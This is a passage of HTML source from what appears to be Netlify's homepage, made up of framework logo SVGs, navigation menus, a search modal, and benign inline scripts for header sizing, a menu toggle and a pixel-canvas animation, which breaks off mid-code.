                                                                    <path fill="currentColor" d="M24.728 10.367a.284.284 0 1 1 .544.166l-.356 1.162a.284.284 0 1 1-.543-.167z"></path>
                                                                </g>
                                                                <mask id="r" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#r)">
                                                                    <path fill="currentColor" d="M26.795 10.498a.284.284 0 0 1 .29.278l.024 1.161a.284.284 0 0 1-.569.012l-.023-1.161a.284.284 0 0 1 .278-.29"></path>
                                                                </g>
                                                                <path stroke="currentColor" stroke-width="1.185" d="M15 29.408c7.957 0 14.408-6.45 14.408-14.408S22.958.592 15 .592.592 7.042.592 15 7.042 29.408 15 29.408Z"></path>
                                                                <mask id="s" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#s)">
                                                                    <path fill="currentColor" fill-rule="evenodd" d="M10.615 9.113c.413 1.748.493 1.698.877 4.802s.137 3.865 0 5.871l2.463-.538c-.77-2.78-.95-3.97-1.533-6.175q-.584-2.205-1.322-3.96-.21-.552-.36-.535-.192.022-.125.535" clip-rule="evenodd"></path>
                                                                    <path fill="currentColor" d="m14.066 5.024-.099.308a6.2 6.2 0 0 1-.472 1.127l-.016.028h.003a3.9 3.9 0 0 1 1.668.23l.038.013c1.587.587 2.47 1.62 2.61 3.077l.031.327-.322-.063-2.224-.434-.03-.006.026.032a6.5 6.5 0 0 1 1.467 3.466l.005.046.04.362-.35-.1c-1.882-.533-3.23-1.266-4.04-2.208a19 19 0 0 1-1.594-2.145l-.026-.04v.023q-.04 1.71-.313 2.768l-.008.031c-.237.898-1.035 2.274-2.397 4.15l-.292.402-.142-.477q-.67-2.266-.376-4.173l.003-.024q-.835.752-2.06 1.809l-.045.04-.396.34-.01-.522c-.046-2.439.53-4.061 1.754-4.84q.334-.21.705-.36l.028-.01-.01-.006a7 7 0 0 1-1.078-.878l-.032-.03-.237-.23.288-.161c1.063-.59 2.004-.746 2.813-.448.442.162.83.43 1.167.768q.1.102.19.206l.02.025.005-.023c.133-.743.49-1.316 1.071-1.707l.023-.015q1.111-.729 2.29-.69zm-5.26 1.884c-.585-.216-1.282-.134-2.097.257l-.007.003.016.014q.679.612 1.207.836l.022.01.67.277-.7.186a4 4 0 0 0-1.155.495c-.967.614-1.483 1.901-1.526 3.883v.001l.036-.03q1.37-1.19 2.192-1.946l.025-.024.637-.586-.235.833-.029.11q-.461 1.821.096 4.056l.007.028.01-.013c1.128-1.593 1.797-2.775 2.004-3.532l.007-.025q.316-1.195.311-3.353v-.012l-.146-.393-.024-.032a4 4 0 0 0-.301-.358l-.031-.031a2.7 2.7 0 0 0-.988-.654Zm4.582-1.399h-.002q-.844.064-1.665.603c-.543.356-.849.907-.918 1.672l-.001.019.057.417q1.195 1.844 1.854 2.619l.06.07q1.03 1.2 3.432 1.947l.008.003-.002-.012c-.21-1.254-.77-2.35-1.688-3.293l-.03-.032-.102-.1-.612-.583.829.165q.963.191 2.611.512l.043.008c-.212-1.073-.937-1.84-2.202-2.318l-.042-.016a3.43 3.43 0 0 0-1.998-.136l-.69.159.444-.552q.338-.42.605-1.127l.01-.025Z"></path>
                                                                    <path stroke="currentColor" stroke-linecap="round" stroke-width=".28" d="M10.615 8.071q-1.091 1.491-1.537 2.748-.447 1.256-.596 2.106m2.133-4.854q-1.408.963-1.91 1.48-.501.516-1.17 1.692"></path>
                                                                    <path stroke="currentColor" stroke-linecap="round" stroke-width=".28" d="M10.535 8.227q-1.735-.296-2.769.576a5.1 5.1 0 0 0-1.502 2.09m4.477-2.863q.942-.938 2.41-.938t2.635 1.387M10.62 8.03q1.643.731 2.564 1.449a5.8 5.8 0 0 1 1.483 1.707"></path>
                                                                    <path stroke="currentColor" stroke-linecap="round" stroke-width=".28" d="M10.62 8.078q1.69.053 2.694.5 1.003.448 1.963 1.435"></path>
                                                                </g>
                                                                <mask id="t" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g stroke="currentColor" stroke-linecap="round" stroke-linejoin="bevel" stroke-width=".377" mask="url(#t)">
                                                                    <path d="m16.978 17.616 3.333.588q.296.109.242.413-.053.303-.374.336l-3.616-.637-1.961-2.022q-.164-.249.026-.438c.19-.189.282-.15.466-.072z" clip-rule="evenodd"></path>
                                                                    <path d="m20.115 18.99-1.032.692M15.832 17.6l-1.11 1.663m1.897-.913.822 1.128m2.409-1.129.07-.345m-1.196.174.077-.374m-1.203.172.11-.377m-1.408-.383.224-.224m-.94-.458.248-.266"></path>
                                                                </g>
                                                            </g>
                                                            <defs>
                                                                <clipPath id="a">
                                                                    <path fill="#fff" d="M0 0h30v30H0z"></path>
                                                                </clipPath>
                                                            </defs>
                                                        </g>
                                                    </symbol>
                                                    <use href="#ai:local:tanstack"></use>
                                                </svg>
                                                <a id="nav-tan-stack" href="https://docs.netlify.com/frameworks/tanstack-start/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" data-astro-cid-sdvpe5d5="">TanStack </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <svg width="1em" height="1em" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="nextjs">
                                                    <symbol id="ai:local:nextjs" viewBox="0 0 24 24">
                                                        <path fill="currentcolor" d="M11.573 0a5 5 0 0 0-.359.007L10.85.04c-3.407.307-6.6 2.146-8.622 4.972a11.9 11.9 0 0 0-2.119 5.243c-.096.659-.108.854-.108 1.747s.012 1.089.108 1.748c.652 4.506 3.86 8.292 8.209 9.695.779.25 1.6.422 2.534.525.363.04 1.935.04 2.299 0 1.611-.178 2.977-.577 4.323-1.264.207-.106.247-.134.219-.158-.02-.013-.9-1.193-1.955-2.62l-1.919-2.592-2.404-3.558a339 339 0 0 0-2.422-3.556c-.009-.002-.018 1.579-.023 3.51-.007 3.38-.01 3.515-.052 3.595a.43.43 0 0 1-.206.214c-.075.037-.14.044-.495.044H7.81l-.108-.068a.44.44 0 0 1-.157-.171l-.05-.106.006-4.703.007-4.705.072-.092a.7.7 0 0 1 .174-.143c.096-.047.134-.051.54-.051.478 0 .558.018.682.154a467 467 0 0 1 2.895 4.361l4.735 7.17 1.9 2.879.096-.063a12.3 12.3 0 0 0 2.466-2.163 11.94 11.94 0 0 0 2.824-6.134c.096-.66.108-.854.108-1.748 0-.893-.012-1.088-.108-1.747-.652-4.506-3.859-8.292-8.208-9.695a12.6 12.6 0 0 0-2.499-.523A33 33 0 0 0 11.573 0m4.068 7.217c.347 0 .408.005.486.047a.47.47 0 0 1 .237.277c.018.06.023 1.365.018 4.304l-.006 4.218-.744-1.14-.746-1.14v-3.066c0-1.982.01-3.097.023-3.15a.48.48 0 0 1 .233-.296c.096-.05.13-.054.5-.054z"></path>
                                                    </symbol>
                                                    <use href="#ai:local:nextjs"></use>
                                                </svg>
                                                <a id="nav-next-js" href="/with/nextjs/" data-astro-cid-sdvpe5d5="">Next.js </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <svg width="1em" height="1em" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="nuxtjs">
                                                    <symbol id="ai:local:nuxtjs" viewBox="0 0 24 24">
                                                        <path fill="currentcolor" d="M13.464 19.83h8.922c.283 0 .562-.073.807-.21a1.6 1.6 0 0 0 .591-.574 1.53 1.53 0 0 0 .216-.783 1.53 1.53 0 0 0-.217-.782L17.792 7.414a1.6 1.6 0 0 0-.591-.573 1.65 1.65 0 0 0-.807-.21c-.283 0-.562.073-.807.21a1.6 1.6 0 0 0-.59.573L13.463 9.99 10.47 4.953a1.6 1.6 0 0 0-.591-.573 1.65 1.65 0 0 0-.807-.21c-.284 0-.562.073-.807.21a1.6 1.6 0 0 0-.591.573L.216 17.481a1.53 1.53 0 0 0-.217.782c0 .275.074.545.216.783a1.6 1.6 0 0 0 .59.574c.246.137.525.21.808.21h5.6c2.22 0 3.856-.946 4.982-2.79l2.733-4.593 1.464-2.457 4.395 7.382h-5.859Zm-6.341-2.46-3.908-.002 5.858-9.842 2.923 4.921-1.957 3.29c-.748 1.196-1.597 1.632-2.916 1.632"></path>
                                                    </symbol>
                                                    <use href="#ai:local:nuxtjs"></use>
                                                </svg>
                                                <a id="nav-nuxt" href="/with/nuxt/" data-astro-cid-sdvpe5d5="">Nuxt </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <svg width="1em" height="1em" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="gatsby">
                                                    <symbol id="ai:local:gatsby" viewBox="0 0 24 24">
                                                        <path fill="currentcolor" d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.6 0 12 0m0 2.571c3.171 0 5.915 1.543 7.629 3.858l-1.286 1.115C16.886 5.572 14.571 4.286 12 4.286c-3.343 0-6.171 2.143-7.286 5.143l9.857 9.857c2.486-.857 4.373-3 4.973-5.572h-4.115V12h6c0 4.457-3.172 8.228-7.372 9.17L2.83 9.944C3.772 5.743 7.543 2.57 12 2.57zm-9.429 9.6 9.344 9.258c-2.4-.086-4.801-.943-6.601-2.743s-2.743-4.201-2.743-6.515"></path>
                                                    </symbol>
                                                    <use href="#ai:local:gatsby"></use>
                                                </svg>
                                                <a id="nav-gatsby" href="/with/gatsby/" data-astro-cid-sdvpe5d5="">Gatsby </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <svg width="1em" height="1em" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="wordpress">
                                                    <symbol id="ai:local:wordpress" viewBox="0 0 24 24">
                                                        <path fill="currentcolor" d="M21.469 6.825c.84 1.537 1.318 3.3 1.318 5.175 0 3.979-2.156 7.456-5.363 9.325l3.295-9.527c.615-1.54.82-2.771.82-3.864 0-.405-.026-.78-.07-1.11m-7.981.105c.647-.03 1.232-.105 1.232-.105.582-.075.514-.93-.067-.899 0 0-1.755.135-2.88.135-1.064 0-2.85-.15-2.85-.15-.585-.03-.661.855-.075.885 0 0 .54.061 1.125.09l1.68 4.605-2.37 7.08L5.354 6.9c.649-.03 1.234-.1 1.234-.1.585-.075.516-.93-.065-.896 0 0-1.746.138-2.874.138-.2 0-.438-.008-.69-.015C4.911 3.15 8.235 1.215 12 1.215c2.809 0 5.365 1.072 7.286 2.833-.046-.003-.091-.009-.141-.009-1.06 0-1.812.923-1.812 1.914 0 .89.513 1.643 1.06 2.531.411.72.89 1.643.89 2.977 0 .915-.354 1.994-.821 3.479l-1.075 3.585-3.9-11.61zM12 22.784c-1.059 0-2.081-.153-3.048-.437l3.237-9.406 3.315 9.087q.036.078.078.149c-1.12.393-2.325.609-3.582.609M1.211 12c0-1.564.336-3.05.935-4.39L7.29 21.709A10.79 10.79 0 0 1 1.211 12M12 0C5.385 0 0 5.385 0 12s5.385 12 12 12 12-5.385 12-12S18.615 0 12 0"></path>
                                                    </symbol>
                                                    <use href="#ai:local:wordpress"></use>
                                                </svg>
                                                <a id="nav-wordpress" href="/with/wordpress/" data-astro-cid-sdvpe5d5="">Wordpress </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <svg width="1em" height="1em" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="react">
                                                    <symbol id="ai:local:react" viewBox="0 0 24 24">
                                                        <path fill="currentcolor" d="M14.23 12.004a2.236 2.236 0 0 1-2.235 2.236 2.236 2.236 0 0 1-2.236-2.236 2.236 2.236 0 0 1 2.235-2.236 2.236 2.236 0 0 1 2.236 2.236m2.648-10.69c-1.346 0-3.107.96-4.888 2.622-1.78-1.653-3.542-2.602-4.887-2.602-.41 0-.783.093-1.106.278-1.375.793-1.683 3.264-.973 6.365C1.98 8.917 0 10.42 0 12.004c0 1.59 1.99 3.097 5.043 4.03-.704 3.113-.39 5.588.988 6.38.32.187.69.275 1.102.275 1.345 0 3.107-.96 4.888-2.624 1.78 1.654 3.542 2.603 4.887 2.603.41 0 .783-.09 1.106-.275 1.374-.792 1.683-3.263.973-6.365C22.02 15.096 24 13.59 24 12.004c0-1.59-1.99-3.097-5.043-4.032.704-3.11.39-5.587-.988-6.38a2.17 2.17 0 0 0-1.092-.278zm-.005 1.09v.006c.225 0 .406.044.558.127.666.382.955 1.835.73 3.704-.054.46-.142.945-.25 1.44a23.5 23.5 0 0 0-3.107-.534A24 24 0 0 0 12.769 4.7c1.592-1.48 3.087-2.292 4.105-2.295zm-9.77.02c1.012 0 2.514.808 4.11 2.28-.686.72-1.37 1.537-2.02 2.442a23 23 0 0 0-3.113.538 15 15 0 0 1-.254-1.42c-.23-1.868.054-3.32.714-3.707.19-.09.4-.127.563-.132zm4.882 3.05q.684.704 1.36 1.564c-.44-.02-.89-.034-1.345-.034q-.691-.001-1.36.034c.44-.572.895-1.096 1.345-1.565zM12 8.1c.74 0 1.477.034 2.202.093q.61.874 1.183 1.86.557.961 1.018 1.946c-.308.655-.646 1.31-1.013 1.95-.38.66-.773 1.288-1.18 1.87a25.6 25.6 0 0 1-4.412.005 27 27 0 0 1-1.183-1.86q-.557-.961-1.018-1.946a25 25 0 0 1 1.013-1.954c.38-.66.773-1.286 1.18-1.868A25 25 0 0 1 12 8.098zm-3.635.254c-.24.377-.48.763-.704 1.16q-.336.585-.635 1.174c-.265-.656-.49-1.31-.676-1.947.64-.15 1.315-.283 2.015-.386zm7.26 0q1.044.153 2.006.387c-.18.632-.405 1.282-.66 1.933a26 26 0 0 0-1.345-2.32zm3.063.675q.727.226 1.375.498c1.732.74 2.852 1.708 2.852 2.476-.005.768-1.125 1.74-2.857 2.475-.42.18-.88.342-1.355.493a24 24 0 0 0-1.1-2.98c.45-1.017.81-2.01 1.085-2.964zm-13.395.004c.278.96.645 1.957 1.1 2.98a23 23 0 0 0-1.086 2.964c-.484-.15-.944-.318-1.37-.5-1.732-.737-2.852-1.706-2.852-2.474s1.12-1.742 2.852-2.476c.42-.18.88-.342 1.356-.494m11.678 4.28c.265.657.49 1.312.676 1.948-.64.157-1.316.29-2.016.39a26 26 0 0 0 1.341-2.338zm-9.945.02c.2.392.41.783.64 1.175q.345.586.705 1.143a22 22 0 0 1-2.006-.386c.18-.63.406-1.282.66-1.933zM17.92 16.32c.112.493.2.968.254 1.423.23 1.868-.054 3.32-.714 3.708-.147.09-.338.128-.563.128-1.012 0-2.514-.807-4.11-2.28.686-.72 1.37-1.536 2.02-2.44 1.107-.118 2.154-.3 3.113-.54zm-11.83.01c.96.234 2.006.415 3.107.532.66.905 1.345 1.727 2.035 2.446-1.595 1.483-3.092 2.295-4.11 2.295a1.2 1.2 0 0 1-.553-.132c-.666-.38-.955-1.834-.73-3.703.054-.46.142-.944.25-1.438zm4.56.64q.661.032 1.345.034.691.001 1.36-.034c-.44.572-.895 1.095-1.345 1.565q-.684-.706-1.36-1.565"></path>
                                                    </symbol>
                                                    <use href="#ai:local:react"></use>
                                                </svg>
                                                <a id="nav-react" href="/with/react/" data-astro-cid-sdvpe5d5="">React </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <svg width="1em" height="1em" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="vue">
                                                    <symbol id="ai:local:vue" viewBox="0 0 24 24">
                                                        <path fill="currentcolor" d="M24 1.61h-9.94L12 5.16 9.94 1.61H0l12 20.78ZM12 14.08 5.16 2.23h4.43L12 6.41l2.41-4.18h4.43Z"></path>
                                                    </symbol>
                                                    <use href="#ai:local:vue"></use>
                                                </svg>
                                                <a id="nav-vue" href="/with/vue/" data-astro-cid-sdvpe5d5="">Vue </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <svg width="1em" height="1em" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="svelte">
                                                    <symbol id="ai:local:svelte" viewBox="0 0 24 24">
                                                        <path fill="currentcolor" d="M10.354 21.125a4.44 4.44 0 0 1-4.765-1.767 4.1 4.1 0 0 1-.703-3.107 4 4 0 0 1 .134-.522l.105-.321.287.21a7.2 7.2 0 0 0 2.186 1.092l.208.063-.02.208a1.25 1.25 0 0 0 .226.83 1.34 1.34 0 0 0 1.435.533 1.2 1.2 0 0 0 .343-.15l5.59-3.562a1.16 1.16 0 0 0 .524-.778 1.24 1.24 0 0 0-.211-.937 1.34 1.34 0 0 0-1.435-.533 1.2 1.2 0 0 0-.343.15l-2.133 1.36a4 4 0 0 1-1.135.499 4.44 4.44 0 0 1-4.765-1.766 4.1 4.1 0 0 1-.702-3.108 3.86 3.86 0 0 1 1.742-2.582l5.589-3.563a4 4 0 0 1 1.135-.499 4.44 4.44 0 0 1 4.765 1.767 4.1 4.1 0 0 1 .703 3.107 4 4 0 0 1-.134.522l-.105.321-.286-.21a7.2 7.2 0 0 0-2.187-1.093l-.208-.063.02-.207a1.25 1.25 0 0 0-.226-.831 1.34 1.34 0 0 0-1.435-.532 1.2 1.2 0 0 0-.343.15L8.62 9.368a1.16 1.16 0 0 0-.524.778 1.24 1.24 0 0 0 .211.937 1.34 1.34 0 0 0 1.435.533 1.2 1.2 0 0 0 .344-.151l2.132-1.36a4 4 0 0 1 1.135-.498 4.44 4.44 0 0 1 4.765 1.766 4.1 4.1 0 0 1 .702 3.108 3.86 3.86 0 0 1-1.742 2.583l-5.589 3.562a4 4 0 0 1-1.135.499m10.358-17.95C18.484-.015 14.082-.96 10.9 1.068L5.31 4.63a6.4 6.4 0 0 0-2.896 4.295 6.75 6.75 0 0 0 .666 4.336 6.4 6.4 0 0 0-.96 2.396 6.83 6.83 0 0 0 1.168 5.167c2.229 3.19 6.63 4.135 9.812 2.108l5.59-3.562a6.4 6.4 0 0 0 2.896-4.295 6.76 6.76 0 0 0-.665-4.336 6.4 6.4 0 0 0 .958-2.396 6.83 6.83 0 0 0-1.167-5.168"></path>
                                                    </symbol>
                                                    <use href="#ai:local:svelte"></use>
                                                </svg>
                                                <a id="nav-svelte" href="/with/svelte/" data-astro-cid-sdvpe5d5="">Svelte </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <svg width="1em" height="1em" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="sitecore">
                                                    <symbol id="ai:local:sitecore" viewBox="0 0 50 50">
                                                        <path fill="currentColor" d="M25 2C12.317 2 2 12.318 2 25s10.317 23 23 23 23-10.318 23-23S37.683 2 25 2m0 6c9.374 0 17 7.626 17 17s-7.626 17-17 17S8 34.374 8 25 15.626 8 25 8m9.244 5.21-6.531 4.546.426.73c.007.015.821 1.435.861 3.514.033 1.654 0 9-11 9-3 0-7-1-7-1s3 3 11 3c10.842 0 10.999-11.512 11-12.002l.004-.996L39.133 20a15.1 15.1 0 0 0-4.889-6.79m.694 8.79C34.629 25.204 32.804 35 22 35c-3.375 0-6.494-.665-8.883-1.379C14.864 34.993 18.375 37 24 37c7.335 0 11.096-6.431 11.133-6.496l.53-.93 2.849 1.899A14.9 14.9 0 0 0 40 25a15 15 0 0 0-.322-3zm1.343 10.389C34.845 34.386 30.792 39 24 39c-2.383 0-4.43-.335-6.166-.836A14.85 14.85 0 0 0 25 40c5.236 0 9.847-2.701 12.531-6.777z"></path>
                                                    </symbol>
                                                    <use href="#ai:local:sitecore"></use>
                                                </svg>
                                                <a id="nav-sitecore" href="/with/sitecore/" data-astro-cid-sdvpe5d5="">Sitecore </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <svg width="1em" height="1em" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="jamstack">
                                                    <symbol id="ai:local:jamstack" viewBox="0 0 24 24">
                                                        <path fill="currentcolor" d="M12 0C5.365 0 0 5.364 0 12s5.365 12 12 12 12-5.364 12-12V0zm.496 3.318h8.17v8.17h-8.17zm-9.168 9.178h8.16v8.149c-4.382-.257-7.904-3.767-8.16-8.149m9.168.016h8.152a8.684 8.684 0 0 1-8.152 8.148z"></path>
                                                    </symbol>
                                                    <use href="#ai:local:jamstack"></use>
                                                </svg>
                                                <a id="nav-jamstack" href="/jamstack/" data-astro-cid-sdvpe5d5="">Jamstack </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-more" href="/integrations/frameworks/" data-astro-cid-sdvpe5d5="">+More </a>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </submenu-utils>
                        </li>
                        <li class="has-submenu" data-astro-cid-2ioqeek6="">
                            <span id="main-nav-resources" data-astro-cid-2ioqeek6="">Resources</span>
                            <submenu-utils data-astro-cid-sdvpe5d5="true">
                                <button class="submenu-toggle" aria-haspopup="true" aria-expanded="false" data-astro-cid-sdvpe5d5="">
                                    <span class="visually-hidden" data-astro-cid-sdvpe5d5="">Toggle resources submenu</span>
                                    <svg width="1em" height="1em" viewBox="0 0 512 512" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="chevron">
                                        <use href="#ai:local:chevron"></use>
                                    </svg>
                                </button>
                                <div id="resources-submenu" class="submenu" data-astro-cid-sdvpe5d5="">
                                    <div class="section l-stack" data-astro-cid-sdvpe5d5="">
                                        <ul class="l-stack" role="list" data-astro-cid-sdvpe5d5="">
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-blog" href="/blog/" data-astro-cid-sdvpe5d5="">Blog </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-changelog" href="/changelog/" data-astro-cid-sdvpe5d5="">Changelog </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-events" href="/events/" data-astro-cid-sdvpe5d5="">Events </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-customers" href="/customers/" data-astro-cid-sdvpe5d5="">Customers </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-partner-directory" href="/agency-directory/" data-astro-cid-sdvpe5d5="">Partner directory </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-all-resources" href="/resources/" data-astro-cid-sdvpe5d5="">All resources </a>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </submenu-utils>
                        </li>
                        <li class="" data-astro-cid-2ioqeek6="">
                            <a id="main-nav-pricing" href="/pricing/" data-astro-cid-2ioqeek6="">Pricing </a>
                        </li>
                        <li class="nav-search" data-astro-cid-2ioqeek6="">
                            <button id="cta-main-nav-search" class="site-search-toggle" data-ntl-search-toggle="" data-astro-cid-3dk7mn5f="">
                                <span class="visually-hidden" data-astro-cid-3dk7mn5f="">Search</span>
                                <svg width="16" height="20" viewBox="0 0 22 24" aria-hidden="true" data-astro-cid-3dk7mn5f="true" data-icon="search">
                                    <use href="#ai:local:search"></use>
                                </svg>
                            </button>
                        </li>
                        <li class="" data-astro-cid-2ioqeek6="">
                            <a id="main-nav-contact" href="/contact/" data-astro-cid-2ioqeek6="">Contact </a>
                        </li>
                        <li class="" data-astro-cid-2ioqeek6="">
                            <a id="main-nav-login" href="https://app.netlify.com/login?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" data-astro-cid-2ioqeek6="">Log in </a>
                        </li>
                    </ul>
                    <a id="signup" href="https://app.netlify.com/signup?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" class="button" data-type="primary" data-astro-cid-2ioqeek6="">Sign up</a>
                </nav>
                <astro-island uid="xJh8y" component-url="/_astro/preact.C2TylGiR.js" component-export="SearchModal" renderer-url="/_astro/client.Bq4EG7vR.js" props="{&quot;className&quot;:[0,&quot;quick-search-modal&quot;],&quot;kapaIntegrationId&quot;:[0,&quot;3c0789a6-c6a8-4fbc-b0cc-235f9e4a6351&quot;],&quot;data-astro-cid-ffcjceyd&quot;:[0,true]}" ssr="" client="only" opts="{&quot;name&quot;:&quot;SearchModal&quot;,&quot;value&quot;:&quot;preact&quot;}" await-children="">
                    <template data-astro-template="">
                        <astro-island uid="Z1o5JWW" component-url="/_astro/preact.C2TylGiR.js" component-export="SearchHeading" renderer-url="/_astro/client.Bq4EG7vR.js" props="{&quot;data-astro-cid-ffcjceyd&quot;:[0,true]}" ssr="" client="only" opts="{&quot;name&quot;:&quot;SearchHeading&quot;,&quot;value&quot;:&quot;preact&quot;}" await-children="">
                            <template data-astro-template="">Help</template>
                            <!--astro:end-->
                        </astro-island>
                        <ul role="list" data-astro-cid-ffcjceyd="">
                            <li data-astro-cid-ffcjceyd="">
                                <astro-island uid="vGdU9" component-url="/_astro/preact.C2TylGiR.js" component-export="SearchLink" renderer-url="/_astro/client.Bq4EG7vR.js" props="{&quot;label&quot;:[0,&quot;Go to docs&quot;],&quot;icon&quot;:[0,&quot;book&quot;],&quot;url&quot;:[0,&quot;https://docs.netlify.com/&quot;],&quot;data-astro-cid-ffcjceyd&quot;:[0,true]}" ssr="" client="only" opts="{&quot;name&quot;:&quot;SearchLink&quot;,&quot;value&quot;:&quot;preact&quot;}"></astro-island>
                            </li>
                            <li data-astro-cid-ffcjceyd="">
                                <astro-island uid="UWwqm" component-url="/_astro/preact.C2TylGiR.js" component-export="SearchLink" renderer-url="/_astro/client.Bq4EG7vR.js" props="{&quot;label&quot;:[0,&quot;Go to support forums&quot;],&quot;icon&quot;:[0,&quot;question&quot;],&quot;url&quot;:[0,&quot;https://answers.netlify.com/&quot;],&quot;data-astro-cid-ffcjceyd&quot;:[0,true]}" ssr="" client="only" opts="{&quot;name&quot;:&quot;SearchLink&quot;,&quot;value&quot;:&quot;preact&quot;}"></astro-island>
                            </li>
                            <li data-astro-cid-ffcjceyd="">
                                <astro-island uid="Z1IShDq" component-url="/_astro/preact.C2TylGiR.js" component-export="SearchLink" renderer-url="/_astro/client.Bq4EG7vR.js" props="{&quot;label&quot;:[0,&quot;Contact support&quot;],&quot;icon&quot;:[0,&quot;question&quot;],&quot;url&quot;:[0,&quot;https://www.netlify.com/support/&quot;],&quot;data-astro-cid-ffcjceyd&quot;:[0,true]}" ssr="" client="only" opts="{&quot;name&quot;:&quot;SearchLink&quot;,&quot;value&quot;:&quot;preact&quot;}"></astro-island>
                            </li>
                            <li data-astro-cid-ffcjceyd="">
                                <astro-island uid="HzK7" component-url="/_astro/preact.C2TylGiR.js" component-export="SearchLink" renderer-url="/_astro/client.Bq4EG7vR.js" props="{&quot;label&quot;:[0,&quot;Contact sales&quot;],&quot;icon&quot;:[0,&quot;comment&quot;],&quot;url&quot;:[0,&quot;https://www.netlify.com/contact/sales/&quot;],&quot;data-astro-cid-ffcjceyd&quot;:[0,true]}" ssr="" client="only" opts="{&quot;name&quot;:&quot;SearchLink&quot;,&quot;value&quot;:&quot;preact&quot;}"></astro-island>
                            </li>
                        </ul>
                    </template>
                    <!--astro:end-->
                </astro-island>
            </section>
            <script>
                const header = document.querySelector('.site-header');

                document.documentElement.style.setProperty('--site-header-height', `${header.getBoundingClientRect().height}px`);

                const resizeObserver = new ResizeObserver( ([el]) => {
                    document.documentElement.style.setProperty('--site-header-height', `${el.contentRect.height}px`);
                }
                );

                header && resizeObserver.observe(header);
            </script>
        </header>
        <script type="module">
            const t = document.querySelector("[data-site-nav-toggle]");
            t?.addEventListener("click", function() {
                let e = this.getAttribute("aria-expanded") === "true" || !1;
                document.documentElement.toggleAttribute("data-site-nav-open", !e),
                this.setAttribute("aria-expanded", String(!e))
            });
        </script>
        <main id="main">
            <div class="l-stack l-stack-3xl">
                <section class="pancake | l-section" data-sb-field-path="GZpQT76vrL14dXDLi338hK:pancakes.0" data-astro-cid-5mutinvq="" style="--breakout-area: full;">
                    <picture class="pancake-graphics" data-options="" data-astro-cid-5mutinvq="true" data-astro-cid-dxfgtee3="" style="--graphic-object-fit: cover;"></picture>
                    <div class="pancake-content | l-stack l-stack-medium" data-astro-cid-5mutinvq="" style="--breakout-area: full;">
                        <div class="ingredient l-breakout ingredient-import" data-astro-cid-gfez5emt="" style="">
                            <section class="hero | l-section" data-astro-cid-f2t6dg3d="">
                                <pixel-canvas class="hero-pixel-bg" data-colors="#060b10, #1e242c, #272f38, #3b434c, #14ffcc" data-gap="14" data-astro-cid-f2t6dg3d="true" data-astro-cid-ihgyfjth="true"></pixel-canvas>
                                <script type="module">
                                    class o {
                                        constructor(t, e, s, i, a, n, r) {
                                            this.width = t.width,
                                            this.height = t.height,
                                            this.ctx = e,
                                            this.x = s,
                                            this.y = i,
                                            this.color = a,
                                            this.speed = this.getRandomValue(.1, .9) * n,
                                            this.size = 0,
                                            this.sizeStep = Math.random() * .4,
                                            this.minSize = .5,
                                            this.maxSizeInteger = 2,
                                            this.maxSize = this.getRandomValue(this.minSize, this.maxSizeInteger),
                                            this.delay = r,
                                            this.counter = 0,
                                            this.counterStep = Math.random() * 4 + (this.width + this.height) * .01,
                                            this.isIdle = !1,
                                            this.isReverse = !1,
                                            this.isShimmer = !1
                                        }
                                        getRandomValue(t, e) {
                                            return Math.random() * (e - t) + t
                                        }
                                        draw() {
                                            const t = this.maxSizeInteger * .5 - this.size * .5;
                                            this.ctx.fillStyle = this.color,
                                            this.ctx.fillRect(this.x + t, this.y + t, this.size, this.size)
                                        }
                                        appear() {
                                            if (this.isIdle = !1,
                                            this.counter <= this.delay) {
                                                this.counter += this.counterStep;
                                                return
                                            }
                                            this.size >= this.maxSize && (this.isShimmer = !0),
